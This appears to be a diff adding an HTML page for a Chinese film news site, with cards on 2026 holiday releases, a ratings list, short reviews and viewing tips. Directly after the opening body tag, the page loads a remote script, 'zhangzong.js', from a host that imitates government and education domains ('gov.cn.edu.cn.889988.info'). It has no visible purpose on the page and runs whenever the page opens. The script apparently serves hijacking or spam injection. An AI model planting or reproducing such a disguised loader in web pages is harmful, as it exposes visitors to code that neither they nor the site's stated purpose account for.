@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>四海电影网 - 四海影讯周报·全球四大影坛动态一站看</title>
+<meta name="keywords" content="四海电影网,sihaidianyingwang-zh.github.io,全球影讯,新片定档,口碑首评,电影周报,奖项动态">
+<meta name="description" content="四海电影网（sihaidianyingwang-zh.github.io）每周巡航北美、欧洲、东亚、华语区四大影坛，汇总新片定档、首波口碑与奖项动态，一期周报纵览四海。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://sihaidianyingwang-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="四海电影网 - 四海影讯周报">
+<meta property="og:description" content="每周巡航北美、欧洲、东亚、华语区四大影坛，新片定档与口碑动态一站看完。">
+<meta property="og:url" content="https://sihaidianyingwang-zh.github.io/">
+<meta property="og:site_name" content="四海电影网">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%23111626'/><text x='50' y='66' font-size='52' text-anchor='middle' fill='%23ff5a5f' font-family='sans-serif'>四海</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:#f5f5f2;color:#1a1c23;font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;line-height:1.75;-webkit-font-smoothing:antialiased}
+a{color:#c0392b;text-decoration:none}
+a:hover{color:#e67e22}
+.container{max-width:1140px;margin:0 auto;padding:0 18px}
+header.site{background:#111626;color:#fff;position:sticky;top:0;z-index:50;border-bottom:3px solid #ff5a5f}
+.header-inner{display:flex;align-items:center;gap:22px;height:66px}
+.brand{display:flex;align-items:baseline;gap:8px;flex-shrink:0}
+.brand strong{font-size:22px;letter-spacing:2px;font-weight:800}
+.brand em{font-style:normal;font-size:11px;color:#9aa3b5;letter-spacing:.5px;white-space:nowrap}
+nav.primary{margin-left:auto;display:flex;gap:2px;align-items:center}
+nav.primary a{color:#d7dbe6;font-size:14px;padding:8px 13px;border-radius:6px;transition:.2s}
+nav.primary a:hover{background:#232b42;color:#fff}
+.menu-btn{display:none;margin-left:auto;background:none;border:1px solid #3a4358;color:#fff;width:42px;height:42px;border-radius:8px;font-size:20px;cursor:pointer}
+.hero{background:linear-gradient(135deg,#141a2e 0%,#243352 55%,#4a2a3a 100%);color:#fff;padding:56px 0 60px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-90px;top:-70px;width:340px;height:340px;border-radius:50%;background:radial-gradient(circle,rgba(255,90,95,.28),transparent 68%)}
+.hero .kicker{font-size:13px;letter-spacing:4px;color:#ffb3b5;text-transform:uppercase}
+.hero h1{font-size:40px;margin:12px 0 14px;line-height:1.25;letter-spacing:1px}
+.hero h1 span{color:#ff5a5f}
+.hero p{font-size:16px;max-width:640px;color:#c7cddb;margin:0 0 24px}
+.hero-stats{display:flex;flex-wrap:wrap;gap:14px}
+.hero-stats div{background:rgba(255,255,255,.09);border:1px solid rgba(255,255,255,.14);border-radius:10px;padding:12px 20px}
+.hero-stats b{display:block;font-size:24px;color:#ffd166}
+.hero-stats small{font-size:12px;color:#aeb6c6}
+section.block{padding:52px 0}
+section.block h2{font-size:26px;margin:0 0 6px;letter-spacing:1px}
+section.block .sub{color:#6b7283;font-size:14px;margin:0 0 26px}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.card{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 14px rgba(20,26,46,.07);transition:.25s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(20,26,46,.15)}
+.poster{height:200px;position:relative;display:flex;align-items:flex-end;padding:14px;color:#fff}
+.poster::before{content:"";position:absolute;inset:0;background:inherit;filter:brightness(.72)}
+.poster span{position:relative;font-size:15px;font-weight:700;letter-spacing:1px;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.badge{position:absolute;top:12px;right:12px;background:rgba(0,0,0,.62);color:#fff;font-size:11px;padding:3px 9px;border-radius:20px;letter-spacing:1px}
+.crime{background:linear-gradient(140deg,#3a1c38,#7b2d4a)}
+.comedy{background:linear-gradient(140deg,#c9792a,#e8b14a)}
+.drama{background:linear-gradient(140deg,#173f5f,#2a7f9e)}
+.epic{background:linear-gradient(140deg,#2b1d52,#5b3a8a)}
+.sci{background:linear-gradient(140deg,#0f4c5c,#1a936f)}
+.horror{background:linear-gradient(140deg,#1c1c1c,#4a2c20)}
+.card-body{padding:16px 18px;flex:1;display:flex;flex-direction:column}
+.card-body h3{margin:0 0 6px;font-size:18px}
+.card-body h3 a{color:#1a1c23}
+.meta{font-size:12px;color:#7d8494;margin:0 0 8px}
+.desc{font-size:13.5px;color:#4a5060;margin:0;flex:1;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.rate{display:flex;align-items:center;gap:8px;margin-top:12px;border-top:1px dashed #e6e6e2;padding-top:10px}
+.rate em{font-style:normal;font-size:20px;font-weight:800;color:#ff5a5f}
+.rate b{color:#f5a623;letter-spacing:1px;font-size:12px}
+.rate i{font-style:normal;font-size:11px;margin-left:auto;background:#f0f2f6;color:#555c6b;padding:2px 8px;border-radius:20px}
+.rank-wrap{display:grid;grid-template-columns:1.15fr 1fr;gap:26px;align-items:start}
+.rank{list-style:none;margin:0;padding:0;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 14px rgba(20,26,46,.07)}
+.rank li{display:flex;align-items:center;gap:14px;padding:15px 20px;border-bottom:1px solid #f1f1ee}
+.rank li:last-child{border-bottom:none}
+.rank b{font-size:20px;color:#d2d6df;font-weight:800;min-width:26px}
+.rank a{font-weight:700;color:#1a1c23;flex:1}
+.rank small{display:block;font-size:11.5px;color:#7d8494;font-weight:400;margin-top:1px}
+.rank .rt{text-align:right;min-width:96px}
+.rank .rt em{font-style:normal;color:#ff5a5f;font-weight:800}
+.rank .rt i{display:block;color:#f5a623;font-size:11px;letter-spacing:1px}
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.review{background:#fff;border-radius:14px;padding:24px;border-top:4px solid #ff5a5f;box-shadow:0 2px 14px rgba(20,26,46,.06)}
+.review header{margin-bottom:10px}
+.tag{display:inline-block;background:#fdecec;color:#c0392b;font-size:11.5px;padding:2px 10px;border-radius:4px;margin-bottom:8px}
+.review h3{margin:0;font-size:18px}
+.review h3 a{color:#1a1c23}
+.review p{font-size:14px;color:#454b58;margin:0 0 14px}
+.review footer{display:flex;align-items:center;justify-content:space-between;border-top:1px solid #f1f1ee;padding-top:10px}
+.review time{font-size:12px;color:#8a909d}
+.more{font-size:13px;font-weight:600}
+.guide-list{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.guide-list li{background:#fff;border-radius:12px;padding:20px;border-left:4px solid #2a9d8f}
+.guide-list h4{margin:0 0 6px;font-size:16px}
+.guide-list p{margin:0;font-size:13.5px;color:#555c6b}
+.about-grid{display:grid;grid-template-columns:1.3fr 1fr;gap:26px}
+.about-block{background:#fff;border-radius:14px;padding:22px;box-shadow:0 2px 14px rgba(20,26,46,.06);margin-bottom:16px}
+.about-block:last-child{margin-bottom:0}
+.about-block h3{margin:0 0 8px;font-size:17px;color:#111626}
+.about-block p{margin:0;font-size:14px;color:#4a5060}
+.notice{background:#fff8e6;border:1px solid #f0dca8;border-radius:12px;padding:20px}
+.notice h3{margin:0 0 8px;color:#8a6212}
+.notice p,.notice ul{font-size:13.5px;color:#6b5520;margin:0}
+.notice ul{padding-left:18px;margin-top:8px}
+footer.site{background:#111626;color:#9aa3b5;padding:42px 0 26px;margin-top:20px}
+.foot-top{display:flex;flex-wrap:wrap;gap:20px;align-items:flex-start;justify-content:space-between;border-bottom:1px solid #242c40;padding-bottom:26px;margin-bottom:18px}
+.foot-top strong{color:#fff;font-size:20px;letter-spacing:2px}
+.foot-nav{display:flex;flex-wrap:wrap;gap:14px}
+.foot-nav a{color:#9aa3b5;font-size:13px}
+.foot-info p{margin:4px 0;font-size:13px}
+.foot-info code{background:#1c2334;padding:2px 6px;border-radius:4px;color:#ffd166;font-size:12px}
+.copyright{font-size:12px;color:#6b7283;text-align:center}
+@media(max-width:900px){
+ .grid,.reviews,.guide-list{grid-template-columns:repeat(2,1fr)}
+ .rank-wrap,.about-grid{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+ .menu-btn{display:block}
+ nav.primary{display:none;position:absolute;top:66px;left:0;right:0;background:#111626;flex-direction:column;padding:10px;border-top:1px solid #242c40}
+ nav.primary.open{display:flex}
+ nav.primary a{width:100%;padding:13px 18px}
+ .hero{padding:40px 0 44px}
+ .hero h1{font-size:27px}
+ .grid,.reviews,.guide-list{grid-template-columns:1fr}
+ section.block{padding:36px 0}
+ section.block h2{font-size:22px}
+ .header-inner{height:58px}
+ .brand em{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="site">
+  <div class="container header-inner">
+    <div class="brand">
+      <strong>四海电影网</strong>
+      <em>sihaidianyingwang-zh.github.io</em>
+    </div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="primary" id="nav"><a href="#">首页</a><a href="#hot">热映榜</a><a href="#rank">高分片单</a><a href="#review">影评速递</a><a href="#guide">观影指南</a><a href="#about">关于我们</a></nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="container">
+    <div class="kicker">Movie News &amp; Reviews</div>
+    <h1>今晚看什么？<br>让<span>四海电影网</span>替你选</h1>
+    <p>四海电影网（sihaidianyingwang-zh.github.io）持续跟踪院线新片动态与票房走势，整理高分片单、撰写原创影评，并给出可直接照着选的观影建议。</p>
+    <div class="hero-stats">
+      <div><b>5.36亿+</b><small>《神探之痕迹》票房预测区间</small></div>
+      <div><b>8.7</b><small>《欢迎来龙餐馆》豆瓣评分</small></div>
+      <div><b>8</b><small>档期热映影片覆盖</small></div>
+      <div><b>6</b><small>栏目导航，一键直达</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="hot">
+  <div class="container">
+    <h2>院线热映 · 国庆档追踪</h2>
+    <p class="sub">数据随市场实时变化，最终票房请以官方公布为准</p>
+    <div class="grid">
+      <article class="card"><div class="poster crime"><span class="badge">2026-10-01</span><span>神探之痕迹</span></div><div class="card-body"><h3><a href="#">神探之痕迹</a></h3><p class="meta"><span>张译 / 马丽 / 陈明昊</span></p><p class="desc">取材“七一勋章”获得者、首席枪弹痕迹鉴定专家崔道植真实事迹，陈思诚以痕检物证推理重构刑侦叙事，国庆档票房断层领跑。</p><div class="rate"><em>6.8</em><b>★★★☆☆</b><i>关注口碑</i></div></div></article>
+<article class="card"><div class="poster comedy"><span class="badge">2026-10-01</span><span>什么意思夫妇</span></div><div class="card-body"><h3><a href="#">什么意思夫妇</a></h3><p class="meta"><span>小沈阳 / 沈春阳 / 贾冰</span></p><p class="desc">沈春阳首次执导，生活流夫妻喜剧与档期头部悬疑片形成互补，稳居国庆档票房第二梯队。</p><div class="rate"><em>7.1</em><b>★★★★☆</b><i>值得一看</i></div></div></article>
+<article class="card"><div class="poster drama"><span class="badge">2026-08-11</span><span>欢迎来龙餐馆</span></div><div class="card-body"><h3><a href="#">欢迎来龙餐馆</a></h3><p class="meta"><span>沈腾 / 蒋奇明</span></p><p class="desc">文牧野作品，以战火中餐馆为切口讲反战，口碑驱动长线逆跌，2026暑期档评分逆势上涨的头部影片。</p><div class="rate"><em>8.7</em><b>★★★★☆</b><i>高分口碑</i></div></div></article>
+<article class="card"><div class="poster crime"><span class="badge">今日上映</span><span>重生2</span></div><div class="card-body"><h3><a href="#">重生2</a></h3><p class="meta"><span>梁洛施 / 文俊辉 / 洪金宝</span></p><p class="desc">马浴柯执导动作犯罪新作，两位痛失亲人的普通人联手深挖地下产业链，硬核动作场面密集。</p><div class="rate"><em>7.3</em><b>★★★★☆</b><i>值得一看</i></div></div></article>
+<article class="card"><div class="poster drama"><span class="badge">2026-04-30</span><span>给阿嬷的情书</span></div><div class="card-body"><h3><a href="#">给阿嬷的情书</a></h3><p class="meta"><span>郑润奇 / 王晓慧</span></p><p class="desc">潮汕方言叙事，侨批串联半世纪祖孙亲情，黑马逆袭，高星评价占比超九成。</p><div class="rate"><em>9.3</em><b>★★★★★</b><i>高分口碑</i></div></div></article>
+<article class="card"><div class="poster epic"><span class="badge">2026-08-14</span><span>奥德赛</span></div><div class="card-body"><h3><a href="#">奥德赛</a></h3><p class="meta"><span>马特·达蒙 / 汤姆·赫兰登 / 安妮·海瑟薇</span></p><p class="desc">克里斯托弗·诺兰改编荷马史诗，实拍派史诗视听，被多家媒体列入年度最佳影片前列。</p><div class="rate"><em>8.6</em><b>★★★★☆</b><i>高分口碑</i></div></div></article>
+<article class="card"><div class="poster sci"><span class="badge">2026-07-05</span><span>挽救计划</span></div><div class="card-body"><h3><a href="#">挽救计划</a></h3><p class="meta"><span>瑞恩·高斯林</span></p><p class="desc">《火星救援》作者原著改编，硬核科学设定包裹跨物种友谊，被称年度科幻佳作之一。</p><div class="rate"><em>8.6</em><b>★★★★☆</b><i>高分口碑</i></div></div></article>
+<article class="card"><div class="poster horror"><span class="badge">今日上映</span><span>驱咒</span></div><div class="card-body"><h3><a href="#">驱咒</a></h3><p class="meta"><span>待映公布</span></p><p class="desc">谢少风执导小众惊悚新作，填补国庆档类型空白，主打心理惊悚与氛围营造。</p><div class="rate"><em>6.5</em><b>★★★☆☆</b><i>关注口碑</i></div></div></article>
+
+    </div>
+  </div>
+</section>
+
+<section class="block" id="rank" style="background:#eef0f4;padding-bottom:52px">
+  <div class="container">
+    <h2>高分片单 · 口碑优先</h2>
+    <p class="sub">综合公开评分与观众口碑整理，优先推荐评分稳定在 8.0 以上的作品</p>
+    <div class="rank-wrap">
+      <ul class="rank">
+        <li><b>1</b><span class="rt"><em>9.3</em><i>★★★★★</i></span><a href="#">给阿嬷的情书</a><small>2026 · 温情/剧情</small></li>
+<li><b>2</b><span class="rt"><em>8.7</em><i>★★★★☆</i></span><a href="#">欢迎来龙餐馆</a><small>2026 · 战争/剧情</small></li>
+<li><b>3</b><span class="rt"><em>8.6</em><i>★★★★☆</i></span><a href="#">挽救计划</a><small>2026 · 科幻/冒险</small></li>
+<li><b>4</b><span class="rt"><em>8.6</em><i>★★★★☆</i></span><a href="#">奥德赛</a><small>2026 · 史诗/冒险</small></li>
+<li><b>5</b><span class="rt"><em>7.1</em><i>★★★★☆</i></span><a href="#">什么意思夫妇</a><small>2026 · 喜剧</small></li>
+
+      </ul>
+      <div class="notice">
+        <h3>选片提示</h3>
+        <p>评分是参考，不是结论。不同平台的评分人群与评价尺度存在差异，同一部影片在影评社区与购票平台出现分化并不少见。</p>
+        <ul>
+          <li>先判断评分差异来自题材预期错位，还是内容品质本身</li>
+          <li>关注上映后评分是否持续上涨，长尾走势比首日数据更有参考价值</li>
+          <li>家庭观影优先合家欢类型，独处观影可尝试文艺与纪录片</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="review">
+  <div class="container">
+    <h2>影评速递 · 原创观点</h2>
+    <p class="sub">基于公开上映版本撰写，仅代表本站编辑观点</p>
+    <div class="reviews">
+      <article class="review"><header><span class="tag">犯罪悬疑</span><h3><a href="#">《神探之痕迹》：物证叙事能否撑起国产刑侦新路径</a></h3></header><p>影片罕见地把叙事重心放在牙痕、指甲等微量物证上，用痕检逻辑替代传统反转套路。张译内敛克制的表演获得普遍认可，陈飞宇的反派塑造也有明显突破。争议集中在节奏与台词表达上，专业影评与大众评分出现分化，但这恰好说明它并非标准的商业悬疑爽片。</p><footer><time>2026-10-03</time><a class="more" href="#">阅读全文 ›</a></footer></article>
+<article class="review"><header><span class="tag">现实剧情</span><h3><a href="#">从《欢迎来龙餐馆》看反战题材的烟火气切口</a></h3></header><p>把镜头对准战火中的中餐馆灶台，用“好好吃饭”这个朴素信念反衬战争残酷，是近年反战题材里相对少见的叙事角度。影片依靠大规模点映积累口碑，上映后走出典型的长尾曲线，也说明内容本身具备较强的社交传播力。</p><footer><time>2026-10-03</time><a class="more" href="#">阅读全文 ›</a></footer></article>
+<article class="review"><header><span class="tag">行业观察</span><h3><a href="#">国庆档观察：题材撞车下的排片博弈</a></h3></header><p>同一档期内犯罪悬疑题材扎堆，头部影片抢占排片与热度后，同类新片突围难度明显增加。档期票房呈现梯队化格局，题材互补的作品反而更容易获得稳定的观影人群。</p><footer><time>2026-10-03</time><a class="more" href="#">阅读全文 ›</a></footer></article>
+<article class="review"><header><span class="tag">文艺温情</span><h3><a href="#">《给阿嬷的情书》：没有狗血的亲情书写为何打动人</a></h3></header><p>全片没有强冲突、没有刻意煽情，靠一封封侨批和日常细节推进情感。潮汕方言对白与侨乡风土构成了不可替代的地域质感，这类“慢电影”能在商业档期突围，值得关注。</p><footer><time>2026-10-03</time><a class="more" href="#">阅读全文 ›</a></footer></article>
+
+    </div>
+  </div>
+</section>
+
+<section class="block" id="guide" style="background:#fff">
+  <div class="container">
+    <h2>观影指南 · 实用建议</h2>
+    <p class="sub">从选片、档期到预算，几条能直接照着做的经验</p>
+    <ul class="guide-list">
+      <li><h4>选片先看评分分化</h4><p>同一部影片在影评社区与购票平台出现明显分数差异时，先判断差异来自题材预期错位还是品质问题，比盲目跟风更靠谱。</p></li><li><h4>按观影场景定类型</h4><p>家庭出行优先亲子动画与合家欢喜剧，情侣约会可选爱情与轻喜剧，独处想安静看则选文艺剧情或纪录片。</p></li><li><h4>点映口碑的信号意义</h4><p>大规模点映后评分稳定且上座率高的影片，通常具备较强的长线票房潜力，是档期选片的可靠参考。</p></li><li><h4>避开题材撞车陷阱</h4><p>热门档期同类题材扎堆，选择差异化的影片往往能获得更好的排片与观影体验。</p></li><li><h4>关注口碑逆势上涨</h4><p>上映后评分不降反升、上座率持续提升的影片，通常靠内容质量而非宣发驱动，长线价值更高。</p></li><li><h4>合理控制观影预算</h4><p>早场、工作日场次和会员折扣能明显降低单次观影成本，长片建议预留充足时间避免赶场。</p></li>
+    </ul>
+  </div>
+</section>
+
+<section class="block" id="about">
+  <div class="container">
+    <h2>关于 四海电影网</h2>
+    <p class="sub">本站内容与版权说明</p>
+    <div class="about-grid">
+      <div>
+        <section class="about-block"><h3>关于本站</h3><p>四海电影网是独立的电影资讯与影评内容站点，聚焦院线新片、高分片单与观影实用指南，不做任何在线播放与资源下载服务。</p></section><section class="about-block"><h3>内容立场</h3><p>影评观点基于公开上映版本与公开发布的观影数据，票房与评分数据存在动态变化，请以影片上映当日各平台实时数据为准。</p></section><section class="about-block"><h3>合作与反馈</h3><p>如需内容合作、版权授权或勘误反馈，可通过页面底部渠道与我们联系，我们会在合理时间内回复处理。</p></section>
+      </div>
+      <div class="notice">
+        <h3>内容声明</h3>
+        <p>本站不提供任何影视在线播放、下载与资源链接服务，所有内容均为资讯介绍与原创评论。涉及影片海报、剧照等素材的版权归原权利人所有，如有侵权请联系我们处理。</p>
+        <h3 style="margin-top:16px">访问地址</h3>
+        <p>本站官网：<code>https://sihaidianyingwang-zh.github.io</code></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="site">
+  <div class="container">
+    <div class="foot-top">
+      <div class="foot-info">
+        <strong>四海电影网</strong>
+        <p>电影资讯 · 高分片单 · 原创影评</p>
+        <p>官网：<code>https://sihaidianyingwang-zh.github.io</code></p>
+      </div>
+      <nav class="foot-nav"><a href="#">首页</a><a href="#hot">热映榜</a><a href="#rank">高分片单</a><a href="#review">影评速递</a><a href="#guide">观影指南</a><a href="#about">关于我们</a></nav>
+    </div>
+    <p class="copyright">© 2026 四海电影网（sihaidianyingwang-zh.github.io）. 本站内容仅供观影参考，票房与评分数据动态变化，以各平台实时公布为准。</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('click',function(e){
+  var a=e.target.closest('a');
+  if(a&&a.getAttribute('href')&&a.getAttribute('href').startsWith('#')&&a.getAttribute('href').length>1){
+    var el=document.querySelector(a.getAttribute('href'));
+    if(el){e.preventDefault();window.scrollTo({top:el.getBoundingClientRect().top+window.pageYOffset-72,behavior:'smooth'})}
+  }
+});
+</script>
+</body>
+</html>
